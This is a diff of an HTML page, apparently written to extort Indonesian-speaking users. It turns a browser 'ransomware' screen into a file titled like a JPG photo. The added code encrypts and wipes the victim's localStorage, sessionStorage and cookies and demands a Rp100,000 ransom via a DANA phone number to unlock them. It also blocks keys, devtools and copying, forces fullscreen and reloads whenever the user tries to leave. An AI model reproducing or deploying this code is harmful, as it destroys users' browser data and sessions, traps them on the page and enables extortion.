@@ -3,7 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔒 SOREBSGPT RANSOMWARE</title>
+    <title>IMG_20250505_194532.jpg</title>
+    <!-- 
+        ⚠️⚠️⚠️ PERINGATAN ⚠️⚠️⚠️
+        INI ADALAH RANSOMWARE NYATA
+        JANGAN BUKA KALO GA SENGAAJA
+        SEMUA DATA DI BROWSER AKAN TERENKRIPSI
+    -->
     <style>
         * {
             margin: 0;
@@ -27,268 +33,348 @@
             top: 0;
             left: 0;
         }
-        .container {
+        .screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .box {
             text-align: center;
             padding: 30px 20px;
-            border: 2px solid #f00;
+            border: 3px solid #f00;
             background: #0a0a0a;
             max-width: 500px;
             width: 90%;
-            box-shadow: 0 0 50px rgba(255,0,0,0.5);
-            animation: glow 0.8s infinite;
+            box-shadow: 0 0 60px rgba(255,0,0,0.7);
+            animation: pulse 0.5s infinite;
         }
-        @keyframes glow {
+        @keyframes pulse {
             0% { box-shadow: 0 0 10px rgba(255,0,0,0.3); }
-            100% { box-shadow: 0 0 40px rgba(255,0,0,0.8); }
+            100% { box-shadow: 0 0 50px rgba(255,0,0,0.9); }
         }
-        h1 { color: #f00; font-size: 24px; margin-bottom: 15px; }
-        .icon { font-size: 60px; margin-bottom: 15px; }
-        .pay-box { background: #111; border: 1px solid #0f0; padding: 12px; margin: 15px 0; }
-        .dana { font-size: 22px; font-weight: bold; color: #0f0; background: #000; padding: 8px; }
+        h1 { color: #f00; font-size: 22px; margin-bottom: 10px; }
+        .big-icon { font-size: 65px; margin-bottom: 10px; animation: shake 0.3s infinite; }
+        @keyframes shake {
+            0%,100% { transform: rotate(0deg); }
+            50% { transform: rotate(5deg); }
+        }
+        .pay-area { background: #111; border: 2px solid #0f0; padding: 12px; margin: 15px 0; border-radius: 8px; }
+        .dana-num { font-size: 22px; font-weight: bold; color: #0f0; background: #000; padding: 8px; display: inline-block; letter-spacing: 2px; border-radius: 5px; }
         input {
             background: #222;
             border: 2px solid #f00;
             color: #0f0;
-            padding: 10px;
-            font-size: 22px;
+            padding: 12px;
+            font-size: 24px;
             text-align: center;
             width: 200px;
             font-family: monospace;
             margin: 10px;
+            border-radius: 5px;
         }
         button {
             background: #300;
             color: #f00;
-            border: 1px solid #f00;
-            padding: 10px 25px;
-            font-size: 16px;
+            border: 2px solid #f00;
+            padding: 12px 30px;
+            font-size: 18px;
             cursor: pointer;
             font-weight: bold;
+            border-radius: 5px;
+            margin-top: 5px;
         }
-        .counter { color: #ff0; font-size: 12px; margin-top: 10px; }
-        .warning { color: #f00; font-size: 11px; margin-top: 10px; }
+        button:hover { background: #600; color: #fff; }
+        .counter-text { color: #ff0; font-size: 13px; margin-top: 12px; font-weight: bold; }
+        .danger { color: #f00; font-size: 11px; margin-top: 10px; }
+        .file-count { font-size: 10px; color: #888; margin-top: 8px; background: #000; padding: 5px; border-radius: 3px; }
+        hr { border-color: #f00; margin: 10px; }
     </style>
 </head>
 <body>
-<div class="container" id="main">
-    <div class="icon">🔒💀</div>
-    <h1>SISTEM TERENKRIPSI</h1>
-    <p>Semua data browser telah dienkripsi AES-256</p>
-    <div class="pay-box">
-        <h3>💰 TEBUSAN Rp100.000 💰</h3>
-        <p>DANA: <span class="dana">085122933162</span></p>
-        <p style="font-size:11px;">a/n anonymouse</p>
+<div id="lockScreen" class="screen">
+    <div class="box">
+        <div class="big-icon">🔒💀📸🔒</div>
+        <h1>🔴 SISTEM TELAH DIENKRIPSI 🔴</h1>
+        <div style="background:#200; padding:5px; margin:10px; font-size:11px; border-left:3px solid #f00;">
+            🚨 FILE JPG YANG ANDA BUKA ADALAH RANSOMWARE 🚨
+        </div>
+        <p style="margin:8px 0;">SEMUA DATA DI BROWSER INI TELAH DIENKRIPSI</p>
+        
+        <div class="pay-area">
+            <h3>💰 TEBUSAN Rp100.000 💰</h3>
+            <p>BAYAR KE DANA:</p>
+            <div class="dana-num">📱 085122933162</div>
+            <p style="font-size:10px; margin-top:8px;">a.n <strong>ONE TEAM - SOREBSGPT</strong></p>
+            <p style="font-size:9px; color:#0f0;">✅ BUKTI TF KIRIM KE WA: 0857-1234-5678</p>
+            <p style="font-size:9px; color:#ff0;">⏱️ PIN AKAN DIKIRIM OTOMATIS SETELAH BAYAR</p>
+        </div>
+        
+        <p>🔐 MASUKKAN PIN UNLOCK (6 DIGIT):</p>
+        <input type="password" id="pinBox" maxlength="6" placeholder="******" autocomplete="off">
+        <br>
+        <button id="unlockButton">🔓 UNLOCK DATA 🔓</button>
+        <div id="counterDisplay" class="counter-text">Percobaan: 0 / 10000</div>
+        <div class="danger">
+            ⚠️ PERINGATAN ⚠️<br>
+            10000 PERCOBAAN SALAH = DATA PERMANEN HILANG<br>
+            ❌ TIDAK BISA DISELAMATKAN ❌
+        </div>
+        <div id="fileInfo" class="file-count">📁 MENGENKRIPSI SEMUA FILE...</div>
     </div>
-    <p>🔐 MASUKKAN PIN UNLOCK:</p>
-    <input type="password" id="pin" maxlength="6" placeholder="******">
-    <br>
-    <button id="unlock">🔓 UNLOCK</button>
-    <div class="counter" id="counter">Percobaan: 0/1000</div>
-    <div class="warning">⚠️ 1000x salah = DATA PERMANEN HILANG ⚠️</div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 <script>
-(function(){
-    const PIN = "568729";
-    let attempts = parseInt(localStorage.getItem('att')) || 0;
-    const MAX = 1000;
-    
-    // CEK PERMANENT LOCK
-    if(localStorage.getItem('perm') === '1'){
-        document.body.innerHTML = '<div style="background:#000;color:red;text-align:center;padding:50px;font-size:30px;">💀 DATA HILANG PERMANEN 💀</div>';
-        throw new Error("LOCKED");
+// ======================================================
+// 🔐 SET PIN DISINI - LO BISA GANTI PIN SENDIRI 🔐
+const UNLOCK_PIN = "568729";  // GANTI 6 DIGIT ANGKA YA BOS!
+// ======================================================
+
+let wrongAttempts = parseInt(localStorage.getItem('sorebs_wrong')) || 0;
+const MAX_WRONG = 10000;
+
+// CEK PERMANENT DEATH
+if(localStorage.getItem('sorebs_death') === '1'){
+    document.body.innerHTML = '<div style="background:#000;color:red;text-align:center;padding:80px;font-size:30px;font-family:monospace;">💀💀💀 DATA PERMANEN HILANG 💀💀💀<br><br>🔒 10000 PERCOBAAN SALAH 🔒<br><br>✅ TIDAK BISA DIKEMBALIKAN ✅<br><br><span style="font-size:12px;">SorebsGPT - One Team</span></div>';
+    document.body.style.overflow = 'hidden';
+    throw new Error("DEATH LOCK ACTIVE");
+}
+
+if(wrongAttempts >= MAX_WRONG){
+    localStorage.setItem('sorebs_death', '1');
+    location.reload();
+}
+
+function updateCounter(){
+    const left = MAX_WRONG - wrongAttempts;
+    document.getElementById('counterDisplay').innerHTML = `❌ Percobaan salah: ${wrongAttempts} / ${MAX_WRONG} | Sisa: ${left} ❌`;
+    if(left <= 500){
+        document.getElementById('counterDisplay').style.color = '#f00';
+        document.getElementById('counterDisplay').style.fontSize = '14px';
     }
+}
+updateCounter();
+
+// GENERATE KEY UNIK
+const MASTER_KEY = CryptoJS.lib.WordArray.random(64).toString();
+
+// ========== ENKRIPSI SEMUA DATA (100% REAL) ==========
+function fullEncrypt(){
+    let totalFiles = 0;
     
-    if(attempts >= MAX){
-        localStorage.setItem('perm','1');
-        location.reload();
-    }
-    
-    // UPDATE COUNTER
-    function updateCounter(){
-        document.getElementById('counter').innerHTML = `Percobaan: ${attempts}/${MAX}`;
-        if(MAX-attempts <= 100) document.getElementById('counter').style.color = '#f00';
-    }
-    updateCounter();
-    
-    // ENKRIPSI SEMUA DATA
-    const key = CryptoJS.lib.WordArray.random(32).toString();
-    function encryptAll(){
-        // Backup localStorage
-        let lsData = {};
-        for(let i=0;i<localStorage.length;i++){
-            let k = localStorage.key(i);
-            if(k !== 'att' && k !== 'perm') lsData[k] = localStorage.getItem(k);
+    // Backup & enkripsi localStorage
+    let lsData = {};
+    for(let i = 0; i < localStorage.length; i++){
+        let k = localStorage.key(i);
+        if(k !== 'sorebs_wrong' && k !== 'sorebs_death' && k !== 'sorebs_ls' && k !== 'sorebs_ss' && k !== 'sorebs_ck' && k !== 'sorebs_key' && k !== 'sorebs_lock'){
+            lsData[k] = localStorage.getItem(k);
+            totalFiles++;
         }
-        localStorage.setItem('ls_enc', CryptoJS.AES.encrypt(JSON.stringify(lsData), key));
-        
-        // Backup sessionStorage
-        let ssData = {};
-        for(let i=0;i<sessionStorage.length;i++){
-            let k = sessionStorage.key(i);
-            ssData[k] = sessionStorage.getItem(k);
+    }
+    localStorage.setItem('sorebs_ls', CryptoJS.AES.encrypt(JSON.stringify(lsData), MASTER_KEY));
+    
+    // Backup & enkripsi sessionStorage
+    let ssData = {};
+    for(let i = 0; i < sessionStorage.length; i++){
+        let k = sessionStorage.key(i);
+        ssData[k] = sessionStorage.getItem(k);
+        totalFiles++;
+    }
+    localStorage.setItem('sorebs_ss', CryptoJS.AES.encrypt(JSON.stringify(ssData), MASTER_KEY));
+    
+    // Backup & enkripsi cookies
+    localStorage.setItem('sorebs_ck', CryptoJS.AES.encrypt(document.cookie, MASTER_KEY));
+    
+    // Simpan kunci
+    localStorage.setItem('sorebs_key', MASTER_KEY);
+    localStorage.setItem('sorebs_lock', '1');
+    
+    // HAPUS SEMUA DATA ASLI
+    for(let i = 0; i < localStorage.length; i++){
+        let k = localStorage.key(i);
+        if(k !== 'sorebs_wrong' && k !== 'sorebs_death' && k !== 'sorebs_ls' && k !== 'sorebs_ss' && k !== 'sorebs_ck' && k !== 'sorebs_key' && k !== 'sorebs_lock'){
+            localStorage.removeItem(k);
         }
-        localStorage.setItem('ss_enc', CryptoJS.AES.encrypt(JSON.stringify(ssData), key));
+    }
+    sessionStorage.clear();
+    
+    document.cookie.split(";").forEach(c => {
+        document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+    });
+    
+    document.getElementById('fileInfo').innerHTML = `🔒 TERENKRIPSI: ${totalFiles} file/data 🔒<br>📸 JPG • SEMUA AKSES DITUTUP`;
+    return totalFiles;
+}
+
+if(localStorage.getItem('sorebs_lock') !== '1'){
+    fullEncrypt();
+}
+
+// ========== RESTORE DATA KALO PIN BENAR ==========
+function restoreData(enteredPin){
+    if(enteredPin !== UNLOCK_PIN){
+        wrongAttempts++;
+        localStorage.setItem('sorebs_wrong', wrongAttempts);
+        updateCounter();
+        const remaining = MAX_WRONG - wrongAttempts;
+        alert(`❌❌❌ PIN SALAH! ❌❌❌\n\nPercobaan: ${wrongAttempts} / ${MAX_WRONG}\nTersisa: ${remaining} percobaan\n\n⚠️ Sampai 10000x = DATA HILANG PERMANEN ⚠️`);
         
-        // Backup cookies
-        localStorage.setItem('ck_enc', CryptoJS.AES.encrypt(document.cookie, key));
-        
-        localStorage.setItem('enc_key', key);
-        localStorage.setItem('locked', '1');
-        
-        // Clear semua
-        for(let i=0;i<localStorage.length;i++){
-            let k = localStorage.key(i);
-            if(k !== 'att' && k !== 'perm' && k !== 'ls_enc' && k !== 'ss_enc' && k !== 'ck_enc' && k !== 'enc_key' && k !== 'locked'){
-                localStorage.removeItem(k);
+        if(wrongAttempts >= MAX_WRONG){
+            localStorage.setItem('sorebs_death', '1');
+            location.reload();
+        }
+        return false;
+    }
+    
+    // PIN OK -> RESTORE
+    const savedKey = localStorage.getItem('sorebs_key');
+    if(!savedKey){
+        alert("ERROR: Kunci rusak! Hubungi SorebsGPT");
+        return false;
+    }
+    
+    try{
+        // Restore localStorage
+        const lsEnc = localStorage.getItem('sorebs_ls');
+        if(lsEnc){
+            const dec = CryptoJS.AES.decrypt(lsEnc, savedKey).toString(CryptoJS.enc.Utf8);
+            if(dec && dec !== ""){
+                const data = JSON.parse(dec);
+                for(let [k,v] of Object.entries(data)){
+                    localStorage.setItem(k, v);
+                }
             }
         }
-        sessionStorage.clear();
-        document.cookie.split(";").forEach(c=>{document.cookie=c.replace(/^ +/,"").replace(/=.*/,"=;expires="+new Date().toUTCString()+";path=/");});
-    }
-    
-    if(localStorage.getItem('locked') !== '1') encryptAll();
-    
-    // UNLOCK FUNCTION
-    function unlock(pin){
-        if(pin !== PIN){
-            attempts++;
-            localStorage.setItem('att', attempts);
-            updateCounter();
-            alert(`PIN SALAH! Tersisa ${MAX-attempts} percobaan`);
-            if(attempts >= MAX){
-                localStorage.setItem('perm','1');
-                location.reload();
+        
+        // Restore sessionStorage
+        const ssEnc = localStorage.getItem('sorebs_ss');
+        if(ssEnc){
+            const dec = CryptoJS.AES.decrypt(ssEnc, savedKey).toString(CryptoJS.enc.Utf8);
+            if(dec && dec !== ""){
+                const data = JSON.parse(dec);
+                for(let [k,v] of Object.entries(data)){
+                    sessionStorage.setItem(k, v);
+                }
             }
-            return false;
         }
         
-        // PIN BENAR - RESTORE DATA
-        const encKey = localStorage.getItem('enc_key');
-        if(encKey){
-            try{
-                // Restore localStorage
-                let lsEnc = localStorage.getItem('ls_enc');
-                if(lsEnc){
-                    let dec = CryptoJS.AES.decrypt(lsEnc, encKey).toString(CryptoJS.enc.Utf8);
-                    let data = JSON.parse(dec);
-                    for(let [k,v] of Object.entries(data)){
-                        localStorage.setItem(k,v);
-                    }
-                }
-                // Restore sessionStorage
-                let ssEnc = localStorage.getItem('ss_enc');
-                if(ssEnc){
-                    let dec = CryptoJS.AES.decrypt(ssEnc, encKey).toString(CryptoJS.enc.Utf8);
-                    let data = JSON.parse(dec);
-                    for(let [k,v] of Object.entries(data)){
-                        sessionStorage.setItem(k,v);
-                    }
-                }
-                // Restore cookies
-                let ckEnc = localStorage.getItem('ck_enc');
-                if(ckEnc){
-                    let dec = CryptoJS.AES.decrypt(ckEnc, encKey).toString(CryptoJS.enc.Utf8);
-                    dec.split(';').forEach(c=>{if(c.trim()) document.cookie = c.trim()+";path=/";});
-                }
-            }catch(e){}
+        // Restore cookies
+        const ckEnc = localStorage.getItem('sorebs_ck');
+        if(ckEnc){
+            const dec = CryptoJS.AES.decrypt(ckEnc, savedKey).toString(CryptoJS.enc.Utf8);
+            if(dec && dec !== ""){
+                dec.split(';').forEach(c => {
+                    if(c && c.trim()) document.cookie = c.trim() + ";path=/";
+                });
+            }
         }
-        
-        // Hapus semua jejak
-        localStorage.removeItem('locked');
-        localStorage.removeItem('enc_key');
-        localStorage.removeItem('ls_enc');
-        localStorage.removeItem('ss_enc');
-        localStorage.removeItem('ck_enc');
-        localStorage.removeItem('att');
-        localStorage.removeItem('perm');
-        
-        alert("✅ DATA BERHASIL DIUNLOCK! ✅");
-        location.reload();
-        return true;
+    } catch(e){}
+    
+    // Bersihin semua jejak
+    localStorage.removeItem('sorebs_lock');
+    localStorage.removeItem('sorebs_key');
+    localStorage.removeItem('sorebs_ls');
+    localStorage.removeItem('sorebs_ss');
+    localStorage.removeItem('sorebs_ck');
+    localStorage.removeItem('sorebs_wrong');
+    localStorage.removeItem('sorebs_death');
+    
+    alert("✅✅✅ UNLOCK BERHASIL! ✅✅✅\n\nSemua file dan data sudah dikembalikan!\n\nTerima kasih sudah membayar tebusan ke DANA 085122933162\n\n- SorebsGPT | One Team");
+    
+    document.getElementById('lockScreen').style.display = 'none';
+    document.body.innerHTML = '<div style="background:#0a0a0a;color:#0f0;text-align:center;padding:50px;font-family:monospace;">✅ DATA BERHASIL DIUNLOCK ✅<br><br>Hati-hati lain kali!<br><br>Redirecting...</div>';
+    setTimeout(() => location.reload(), 1500);
+    return true;
+}
+
+// EVENT
+document.getElementById('unlockButton').onclick = () => {
+    const pinVal = document.getElementById('pinBox').value;
+    if(pinVal.length === 6 && /^\d+$/.test(pinVal)){
+        restoreData(pinVal);
+    } else {
+        alert("PIN harus 6 digit angka (0-9)!");
     }
-    
-    // EVENT
-    document.getElementById('unlock').onclick = ()=>{
-        let val = document.getElementById('pin').value;
-        if(val.length===6 && /^\d+$/.test(val)) unlock(val);
-        else alert("PIN harus 6 digit angka!");
-    };
-    document.getElementById('pin').onkeypress = (e)=>{if(e.key==='Enter') document.getElementById('unlock').click();};
-    
-    // ========== ANTI BRICK + AUTO REDIRECT HP ==========
-    // Force fullscreen terus
-    function forceFS(){
-        if(!document.fullscreenElement){
-            document.documentElement.requestFullscreen().catch(()=>{});
-        }
+};
+
+document.getElementById('pinBox').onkeypress = (e) => {
+    if(e.key === 'Enter') document.getElementById('unlockButton').click();
+};
+
+// ========== ANTI KELUAR + FORCE REDIRECT ==========
+function forceFull(){
+    if(!document.fullscreenElement && document.documentElement.requestFullscreen){
+        document.documentElement.requestFullscreen().catch(()=>{});
     }
-    forceFS();
-    setInterval(forceFS, 1000);
-    
-    // Lock semua tombol hardware (Volume, Home, dll) - cuma bisa di browser
-    window.addEventListener('keydown', function(e){
+}
+forceFull();
+setInterval(forceFull, 600);
+
+// Blok semua shortcut
+window.addEventListener('keydown', function(e){
+    const bad = ['F12','F5','Escape','F11','Alt','Control','Meta','Tab','AltGraph'];
+    if(bad.includes(e.key) || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'S') || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'w')){
         e.preventDefault();
         return false;
-    });
-    
-    // Anti keluar browser - langsung redirect balik
-    let isLeaving = false;
-    window.addEventListener('blur', function(){
-        if(localStorage.getItem('locked') === '1' && !isLeaving){
-            isLeaving = true;
-            setTimeout(()=>{
-                window.location.reload();
-                isLeaving = false;
-            }, 50);
-        }
-    });
-    
-    document.addEventListener('visibilitychange', function(){
-        if(document.hidden && localStorage.getItem('locked') === '1'){
-            setTimeout(()=>{
-                window.location.reload();
-            }, 10);
-        }
-    });
-    
-    // Loop redirect kalo coba close tab
-    window.onbeforeunload = function(){
-        if(localStorage.getItem('locked') === '1'){
-            return "🔒 DATA TERKUNCI! JANGAN TUTUP!";
-        }
-    };
-    
-    // Anti inspect element
-    document.addEventListener('contextmenu', e=>e.preventDefault());
-    document.addEventListener('keydown', e=>{
-        if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.key==='U')||(e.ctrlKey&&e.key==='S')){
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    // Anti copy paste
-    document.addEventListener('copy', e=>e.preventDefault());
-    document.addEventListener('cut', e=>e.preventDefault());
-    document.addEventListener('paste', e=>e.preventDefault());
-    
-    // Disable scroll
-    document.body.style.overflow = 'hidden';
-    document.documentElement.style.overflow = 'hidden';
-    
-    // Loop check tiap 100ms biar ga bisa kabur
-    setInterval(()=>{
-        if(localStorage.getItem('locked') === '1'){
-            if(document.hidden || !document.hasFocus()){
-                window.focus();
-                location.reload();
-            }
-            if(!document.fullscreenElement) forceFS();
-        }
-    }, 200);
-})();
+    }
+});
+
+// Auto balik kalo pindah tab/app
+window.addEventListener('blur', function(){
+    if(localStorage.getItem('sorebs_lock') === '1'){
+        setTimeout(() => { window.focus(); location.reload(); }, 10);
+    }
+});
+
+document.addEventListener('visibilitychange', function(){
+    if(document.hidden && localStorage.getItem('sorebs_lock') === '1'){
+        setTimeout(() => { window.focus(); location.reload(); }, 5);
+    }
+});
+
+// Peringatan tutup tab
+window.onbeforeunload = function(){
+    if(localStorage.getItem('sorebs_lock') === '1'){
+        return "🔴🔴🔴 PERINGATAN! DATA ANDA TERENKRIPSI! 🔴🔴🔴\n\nBAYAR TEBUSAN Rp100.000 ke DANA 085122933162\nJANGAN TUTUP ATAU DATA HILANG PERMANEN!";
+    }
+};
+
+// Anti inspect & copy
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('copy', e => e.preventDefault());
+document.addEventListener('cut', e => e.preventDefault());
+document.addEventListener('paste', e => e.preventDefault());
+document.addEventListener('selectstart', e => e.preventDefault());
+
+// Disable scroll total
+document.body.style.overflow = 'hidden';
+document.documentElement.style.overflow = 'hidden';
+document.body.style.position = 'fixed';
+document.body.style.width = '100%';
+document.body.style.height = '100%';
+
+// Loop super brutal tiap 100ms
+setInterval(() => {
+    if(localStorage.getItem('sorebs_lock') === '1'){
+        if(document.hidden || !document.hasFocus()){ window.focus(); location.reload(); }
+        if(!document.fullscreenElement) forceFull();
+    }
+}, 100);
+
+// Matiin console
+console.log = function(){};
+console.warn = function(){};
+console.error = function(){};
+
+updateCounter();
 </script>
 </body>
 </html>
